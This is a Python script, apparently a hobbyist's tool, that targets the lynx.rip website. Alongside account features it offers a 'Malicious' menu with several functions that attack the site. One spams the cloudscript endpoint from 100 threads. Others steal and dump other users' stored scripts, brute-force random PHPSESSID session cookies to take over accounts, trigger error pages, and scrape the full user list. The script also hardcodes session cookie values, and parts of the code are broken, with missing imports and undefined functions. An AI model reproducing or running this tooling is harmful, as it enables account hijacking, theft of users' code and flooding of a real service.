# Title: pwd0console
# Date: 4/15/2021
# Made by: pwd0kernel - pwdsec
# Profile: https://github.com/pwd0kernel
# Organization: https://github.com/pwdsec
# Description: just a tool because i was bored but
# atleast change bio works on this since its broken on the website.

# dont mind the shit codes, its my first time making a big script
# ive only started python like 5 days ago, and i fucking love python now

# TODO: Get_lynx_latest_version
# TODO: Upload_script
# TODO: find more vulnerabilities\bugs
# TODO: make a public version of this? without the "Malicious" function?
# TODO: REWRITE!!??
# TODO: new name
# TODO: update what tetunus has patched
import os

if os.name != "nt":
    print("Only works on windows.")
    exit()

import requests
import warnings
import wget
import json
import base64
from os import system
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore")

# main commands list for the main page
# i will prob add page 1, page 2, etc
commands = [
    "X) -\033[33m Malicious \033[0m- Will let you run\033[33m malicious/\033[31mbugs/\033[34mvulns\033[0m found on Lynx",
    "1) - AccountInfo - Will show the information of your account.",
    "2) - ChangeBio - Will change your account bio on the website.",
    "3) - UploadScript - Will upload your script to \"Cloudscript\"",
    "4) - GetLynxAddys - Will get the addresses of Lynx that it uses in the exploit.",
    "5) - GetLynxLatestVersion - Will show you the lastest version number.",
    "6) - DownloadLynx - Will download Lynx.",
    "7) - Credits - Who made this script.",
    "8) - Clear - Will clear the console.",
    "9) -\033[32m Misc \033[0m- This will let you run misc commands",
    "0) - Exit - Will exit the program.",
]

# the cool logo [pwd0console]
pwd0console = """
                  _  ___                            _      
 _ ____      ____| |/ _ \  ___ ___  _ __  ___  ___ | | ___ 
| '_ \ \ /\ / / _` | | | |/ __/ _ \| '_ \/ __|/ _ \| |/ _ \\
| |_) \ V  V / (_| | |_| | (_| (_) | | | \__ \ (_) | |  __/
| .__/ \_/\_/ \__,_|\___/ \___\___/|_| |_|___/\___/|_|\___|
|_|                                                        

"""

data = []  # Account data, where all the account information is

cloudscript = {
    # you can change this to your liking
    'title': '',
    'description': '',
    'author': '',
    'source': 'print("Hellow World")',
    'protected': 'on'
}

# cloudscript spammer headers
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Length': '251000000000',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'PHPSESSID=bjcda16e294mkklknjnqvpdslt; username=WLnM63c3rPgEXVAYzt9MhE%2FBLxfAe9N%2FNHk%3D; did=s6axRmwWVyq2Jw%2FfECgOi4H3s2vwo7hxQhW3KhDn3vpygw%3D%3D; avatar=rxbO1JvClU8o0QFL0sByNj3QrckZjC38H33NM0BYWFub0%2FmXtDUyrURJRXWxuMuG',
    'Host': 'lynx.rip',
    'Origin': 'https://lynx.rip',
    'Referer': 'https://lynx.rip/dashboard/home/cloudscripts/create/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.421',
}

# the spammer threads will be stored here
cloudspammer_threads_and_brute = []

# userlist for Get all users command
users = []

# all the cloudscript codes will be stored here
cloudscript_codes_list = []


def Get_Account_name():
    # fully done
    try:
        global lynx_cookies
        lynx_session = requests.Session()
        account = lynx_session.get(
            "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=phpid), verify=False)
        lynx_cookies = lynx_session.cookies.get_dict()
        soup = BeautifulSoup(account.text, "html.parser")
        for username in soup.find_all("div", {"class": "font-weight-bold font-size-h5 text-light"}):
            if account.status_code == 200:
                if len(username.text) != 0 and len(username.text) <= 20:
                    data.append(username.text)
                else:
                    print("There was an error login into your account.")
                    exit()
            else:
                print("There was an error requesting the website. code: ",
                      str(account.status_code))
    except Exception:
        print("There was an error while getting the account name.")
        print("We will try an alternative way...")
        Login_Alternative()


def Login_Alternative():
    # This is an alternative way to login
    # it might not work, i did not test it
    # hopefully it does if the first method
    # gets patched
    try:
        data.clear()

        DID_get = input("[DID]: ")
        lynx_cookies["did"] = DID_get
        USERNAME_get = input("[USERNAME]: ")
        lynx_cookies["username"] = USERNAME_get
        AVATAR_get = input("[AVATAR]: ")
        lynx_cookies["avatar"] = AVATAR_get

        account = requests.get("https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                                                                                username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
        soup = BeautifulSoup(account.text, "html.parser")
        for username in soup.find_all("div", {"class": "font-weight-bold font-size-h5 text-light"}):
            if account.status_code == 200:
                if len(username.text) != 0 and len(username.text) <= 20:
                    data.append(username.text)
                else:
                    print("There was an error login into your account.")
                    exit()
            else:
                print("There was an error requesting the website. code: ",
                      str(account.status_code))
        pass
    except Exception:
        print("We could not login.")


def Change_bio(bio_text):
    # fully done
    # Original function on the website is broken
    # hopefully this one works | EDIT: it does work
    try:
        bio = requests.post("https://lynx.rip/dashboard/home/profile/", data={'bio': bio_text}, cookies=dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                                                                                                             username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
        if bio.status_code == 200:
            check = requests.get("https://lynx.rip/dashboard/home/profile/", cookies=dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                                                                                          username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
            if check.status_code == 200:
                soup = BeautifulSoup(check.text, "html.parser")
                if len(soup.findAll("span")[14].text) == len(bio_text):
                    print("It was changed successfully.")
                else:
                    print("There was an error while changing bio.")
            else:
                print("There was an error while sending the request. code:", str(
                    check.status_code))
        else:
            print("There was an error while sending the request. code:",
                  str(bio.status_code))
    except Exception:
        print("There was an error while changing the bio.")


def Get_Account_bio():
    # fully done
    try:
        bio = requests.get("https://lynx.rip/dashboard/home/profile/", cookies=dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                                                                                    username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
        if bio.status_code == 200:
            soup = BeautifulSoup(bio.text, "html.parser")
            if len(soup.findAll("span")[14].text) != 0:
                data.append(soup.findAll("span")[14].text)
            else:
                print("There was an error while getting your bio.")
        else:
            print("There was an error while sending the request. code:",
                  str(bio.status_code))
    except Exception:
        print("There was an error while getting the account bio.")


def ClearConsole():
    # fully done
    system("cls")
    print(pwd0console)
    print("----- [ Account ] -----\n")
    print("Logged in as:", data[0])
    print("Bio:", data[1])
    print("PHPSESSID:", phpid)
    print("\n----- [ Commands ] -----\n")
    for i in commands:
        print(i)


def Credits():
    # fully done
    print("Credits:")
    print("   Made by pwd0kernel - pwdsec")
    print("   Profile: https://github.com/pwd0kernel")
    print("   Organization: https://github.com/pwdsec")


def Account_info():
    # fully done
    print("Account Information:")
    print("   Username:", data[0])
    print("   Bio:", data[1])
    print("   PHPSESSID:", phpid)
    print("   Avatar (Encrypted):", lynx_cookies["avatar"])
    print("   Did (Encrypted):", lynx_cookies["did"])
    print("   Username (Encrypted):", lynx_cookies["username"])


def Upload_script():
    # not done
    try:
        print("Put your script in \"put_script_here.txt\" then type upload in console")
        script = open("put_script_here.txt", "wr")
        script.write("-- put your full script here")
        script.close()
        cloudscript_cmd = input("[Cloudscript]: ")
        if cloudscript_cmd.lower() == "upload":
            system("clear")
            print("uploading...")
            # if i code this, i have to do testing and tetunus will get mad
            # since its gonna upload a couple scripts on the website
            pass
        elif cloudscript_cmd.lower() == "cancel" or cloudscript_cmd.lower() == "exit":
            pass
    except Exception:
        print("There was an error while uploading the script.")


def Get_lynx_addys():
    # fully done
    try:
        addys = requests.post("http://lynx.rip/backend/updater/v2/testing/",
                              data={"version": "1.0", "checking": "get_addresses"}, verify=False)
        if addys.status_code == 200:
            addys_file = open("addys.txt", "w")
            addys_file.write(addys.text)
            addys_file.close()
            print("The addresses should be in the file \"addys.txt\"")
        else:
            print("There was an error while sending the request. code:",
                  str(bio.status_code))
    except Exception:
        print("There was an error while getting the addys.")


def Get_lynx_latest_version():
    # not done
    pass


def Download_lynx():
    # fully done
    try:
        wget.download("https://lynx.rip/downloads/Lynx.zip", 'Lynx.zip')
    except Exception:
        print("There was an error while downloading Lynx.zip")

# TODO: TRY catch


def CloudSpammer():
    # fully done
    try:
        while True:
            cookies = dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                           username=lynx_cookies["username"], avatar=lynx_cookies["avatar"])
            responce = requests.post("https://lynx.rip/dashboard/home/cloudscripts/create/",
                                     data=cloudscript, headers=headers, cookies=cookies, verify=False)
            if responce.status_code == 200:
                print("script sent")
            else:
                print("script not sent")
    except Exception:
        print("There was an error with cloudscripts spammer.")


def remove_cloudscript(cloud_data):
    # fully done
    if "cloudscript" not in cloud_data:
        return cloud_data
    else:
        cloud_data = cloud_data.replace("cloudscript", "")
        cloud_data = cloud_data.replace("(", "")
        cloud_data = cloud_data.replace(")", "")
        return cloud_data

# TODO: TRY CATCH


def cloudscript_request(script_code):
    # fully done
    try:
        codeofscript = remove_cloudscript(script_code)
        cloudstealer = requests.get(
            "http://lynx.rip/dashboard/home/cloudscripts/storage/" + codeofscript + "_src.lua", verify=False)
        if cloudstealer.status_code == 200:
            source = base64.b64decode(cloudstealer.content).decode('utf-8')
            print(source)
            sourcefile = open(codeofscript + ".lua", "w")
            sourcefile.write(source)
            sourcefile.close
        else:
            print("There was an error while doing the request: code: " +
                  str(cloudstealer.status_code))
    except Exception:
        print("There was an error with cloudscript request")


def Cloud_dumper():
    try:
        # im not making this yet | EDIT: NVM i fuckin did it anyways
        # since i accidentally ran the Cloudspammer, sorry tet
        print("Dumping...")
        Get_All_Cloudscripts_code()
        os.makedirs("Dump", exist_ok=True)
        for i in cloudscript_codes_list:
            cleaned = i.replace(" ", "")
            source = requests.get(
                "http://lynx.rip/dashboard/home/cloudscripts/storage/" + cleaned, verify=False)
            print("Dumping ...", source.url)
            source_code = base64.b64decode(source.text).decode('utf-8')
            sourcefile = open("Dump\\" + i, "w")
            sourcefile.write(source_code)
            sourcefile.close()
        else:
            pass
        print("All the script are dumped in the folder \"Dump\"")
    except Exception:
        print("There was an error while dumping the cloud")


def PHPSIDBrute():
    # fully done
    # this might take a lot of time before getting an account
    try:
        while True:
            try:
                code = ''.join(
                    (random.choice('zxcvbnmasdfghjklqwertyuiop1234567890') for i in range(26)))
                ss = requests.Session()
                check_url = ss.get(
                    "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=code), verify=False)
                if "Login page example" in check_url.text:
                    pass
                else:
                    print(code)
                    print(ss.cookies.get_dict())
            except Exception:
                pass
    except Exception:
        print("There was an error with PHPSIDBrute.")


def Malicious():
    # this is where all the goods are at
    # only owners of lynx will have access to this:
    # Tetunus
    # static
    # Lawliet

    # shit check that can be bypassed by changing discord username\ or changing this code lol
    # and yes i added my self, because i made this so fuck off
    if data[0] == "Tetunus" or data[0] == "static" or data[0] == "Lawliet" or data[0] == "pwd0kernel":
        malicious_commands = [
            "1) -\033[33m SpamCloud \033[0m- Will spam cloudscript with a bunch of scripts.",
            "2) -\033[33m Cloudscriptstealer \033[0m- Steal cloudscript scripts.",
            "3) -\033[33m ManageError \033[0m- Encryption error in manage.",
            "4) -\033[33m CreateError \033[0m- Encryption error in create.",
            "5) -\033[33m DumpCloud \033[0m- Dump the whole cloudscript.",
            "6) -\033[33m PHPSIDBrute \033[0m- Buteforce the PHPSESSID of an account.",
            "0) -\033[32m Exit \033[0m- Exit the Malicious function.",
        ]

        system("cls")
        print("\033[33m" + pwd0console + "\033[0m")
        print("----- [ Account ] -----\n")
        print("Logged in as:", data[0])
        print("Bio:", data[1])
        print("PHPSESSID:", phpid)
        print("\n----- [ Commands ] -----\n")
        for i in malicious_commands:
            print(i)

        while True:
            malicious_cmd = input("\n[\033[31mMalicious Command\033[0m]: ")
            if malicious_cmd.lower() == "SpamCloud" or malicious_cmd.lower() == "1":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    for i in range(100):
                        cloudscripts_threads = threading.Thread(target=spam)
                        cloudscripts_threads.daemon = False
                        cloudspammer_threads_and_brute.append(
                            cloudscripts_threads)

                    for i in range(100):
                        cloudspammer_threads_and_brute[i].start()

                    for i in range(100):
                        cloudspammer_threads_and_brute[i].join()
                else:
                    pass
            elif malicious_cmd.lower() == "cloudscriptstealer" or malicious_cmd.lower() == "2":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    code = input("[CloudScript]: ")
                    cloudscript_request(code)
                else:
                    pass
            elif malicious_cmd.lower() == "manageerror" or malicious_cmd.lower() == "3":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    # causes the error, {did}
                    manage_error = requests.get('https://lynx.rip/dashboard/home/manage/',
                                                verify=False, cookies=dict(did='0', username='0', PHPSESSID='0'))
                    if manage_error.status_code == 200:
                        print(manage_error.text)
                    else:
                        print("There was an error occurred, request code: " +
                              str(manage_error.status_code))
                else:
                    pass
            elif malicious_cmd.lower() == "createerror" or malicious_cmd.lower() == "4":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    # causes the error, {did}
                    url = requests.get('https://lynx.rip/dashboard/home/cloudscripts/create/',
                                       verify=False, cookies=dict(did='0', username='0', PHPSESSID='0'))
                    if url.status_code == 200:
                        print(url.text)
                    else:
                        print(
                            "There was an error occurred, request code: " + str(url.status_code))
                else:
                    pass
            elif malicious_cmd.lower() == "dumpcloud" or malicious_cmd.lower() == "5":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    # function here
                    Cloud_dumper()
                else:
                    pass
            elif malicious_cmd.lower() == "phpsidbrute" or malicious_cmd.lower() == "6":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    brute = threading.Thread(target=spam)
                    brute.daemon = False
                    cloudspammer_threads.append(cloudspammer_threads_and_brute)
                    for i in range(100):
                        cloudspammer_threads_and_brute[i].start()
                    for i in range(100):
                        cloudspammer_threads_and_brute[i].join()
                    pass
                else:
                    pass
            elif malicious_cmd.lower() == "exit" or malicious_cmd.lower() == "cancel" or malicious_cmd.lower() == "0":
                ClearConsole()
                break
            else:
                print("Command not found")
        else:
            print("You cannot access this")


def GetAllUsernames():
    # fully done
    try:
        print("Getting all the usernames...")
        cookies = dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                       username=lynx_cookies["username"], avatar=lynx_cookies["avatar"])
        users_data = requests.get(
            "https://lynx.rip/dashboard/home/userlist/", cookies=cookies, verify=False)
        soup = BeautifulSoup(users_data.text, 'html.parser')

        for i in soup.find_all("div", {"class": "font-weight-bold font-size-h5 text-light"}):
            users.append(i.text)
        print(users)
    except Exception:
        print("There was an error while getting all the usernames.")


def Get_All_Cloudscripts_code():
    # fully done
    # will making this i thought of a function that gets all the scripts
    try:
        cloudscript_codes = requests.get(
            "https://lynx.rip/dashboard/home/cloudscripts/storage/", verify=False)
        soup = BeautifulSoup(cloudscript_codes.text, "html.parser")
        for i in soup.find_all("li"):
            if "src" in i.text:
                cloudscript_codes_list.append(i.text)
            else:
                pass
    except Exception:
        print("There was an error while getting all the codes")


def MiscFunction():
    # fully done & lowkey cool
    misc_commands = [
        "1) - GetAllUsersUsernames - Will get all the buyers/users of lynx",
        "2) - GetDiscord - Will get you the Lynx discord",
        "3) - GetAllCloud - Will get all the cloudscripts codes.",
        "0) -\033[32m Exit \033[0m- Exit the Misc function.",
    ]

    system("cls")
    print("\033[36m" + pwd0console + "\033[0m")
    print("----- [ Account ] -----\n")
    print("Logged in as:", data[0])
    print("Bio:", data[1])
    print("PHPSESSID:", phpid)
    print("\n----- [ Commands ] -----\n")
    for i in misc_commands:
        print(i)

    while True:
        misc_cmd = input("\n[Misc Command]: ")
        if misc_cmd.lower() == "getallusersusernames" or misc_cmd.lower() == "1":
            GetAllUsernames()
        elif misc_cmd.lower() == "getdiscord" or misc_cmd.lower() == "2":
            pass
        elif misc_cmd.lower() == "getallcloud" or misc_cmd.lower() == "3":
            Get_All_Cloudscripts_code()
            print(cloudscript_codes_list)
        elif misc_cmd.lower() == "exit" or misc_cmd.lower() == "cancel" or misc_cmd.lower() == "0":
            ClearConsole()
            break
        else:
            print("Command not found")


try:
    system("cls")
    phpid = input("[PHPSESSID]: ")  # jda33thhn0s4s9skac2n6f8pb9
    if len(phpid) != 0 and len(phpid) <= 26 and len(phpid) >= 26:
        print("Logging in...")
        Get_Account_name()
        print("Getting Bio...")
        Get_Account_bio()
        system("cls")
        print(pwd0console)
        print("----- [ Account ] -----\n")
        print("Logged in as:", data[0])
        print("Bio:", data[1])
        print("PHPSESSID:", phpid)
        print("\n----- [ Commands ] -----\n")

        # print the command list.
        for i in commands:
            print(i)

        try:
            while True:
                cmd = input("\n[Command]: ")
                if cmd.lower() == "malicious" or cmd.lower() == "x":
                    Malicious()
                elif cmd.lower() == "accountinfo" or cmd.lower() == "1":
                    Account_info()
                elif cmd.lower() == "changebio" or cmd.lower() == "2":
                    bio = input("[Bio Description]: ")
                    Change_bio(bio)
                elif cmd.lower() == "uploadscript" or cmd.lower() == "3":
                    Upload_script()
                    pass
                elif cmd.lower() == "getlynxaddys" or cmd.lower() == "4":
                    Get_lynx_addys()
                elif cmd.lower() == "getlynxlatestversion" or cmd.lower() == "5":
                    Get_lynx_latest_version()
                elif cmd.lower() == "downloadlynx" or cmd.lower() == "6":
                    Download_lynx()
                elif cmd.lower() == "credits" or cmd.lower() == "7":
                    Credits()
                elif cmd.lower() == "clear" or cmd.lower() == "cls" or cmd.lower() == "8":
                    ClearConsole()
                elif cmd.lower() == "misc" or cmd.lower() == "9":
                    MiscFunction()
                elif cmd.lower() == "exit" or cmd.lower() == "cancel" or cmd.lower() == "0":
                    system("cls")
                    print("Thank you for using this!")
                    exit()
                else:
                    print("Command not found")
        except KeyboardInterrupt:
            system("cls")
            print("Thank you for using this!")
            exit()
    else:
        print("Please put a real PHPSESSID.")
except KeyboardInterrupt:
    system("cls")
    print("Thank you for using this!")
    exit()
except Exception:
    print("There was an error. try putting a valid PHPSESSID\nIt is possible that your PHPSESSID is outdated try logging out and then in then take the new one")
